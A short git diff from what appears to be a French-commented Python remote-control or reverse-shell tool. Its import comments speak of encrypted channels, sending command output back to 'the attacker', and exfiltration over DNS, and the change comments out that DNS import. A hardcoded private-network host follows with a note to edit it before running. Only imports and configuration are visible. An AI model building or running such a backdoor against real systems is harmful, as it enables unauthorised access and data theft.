@@ -8,7 +8,7 @@ import ssl          # chiffrement des échanges
 import subprocess   # retourner le résultats des commandes à l'attaquant
 import os           # exécuter des commandes systèmes
 import shutil       # manipuler les fichiers
-import dns_client   # exfiltration via DNS
+#import dns_client   # exfiltration via DNS
 
 # /!\ MODIFIER @ HOST AVANT D'EXECUTER LE PROGRAMME
 HOST = '192.168.1.6'
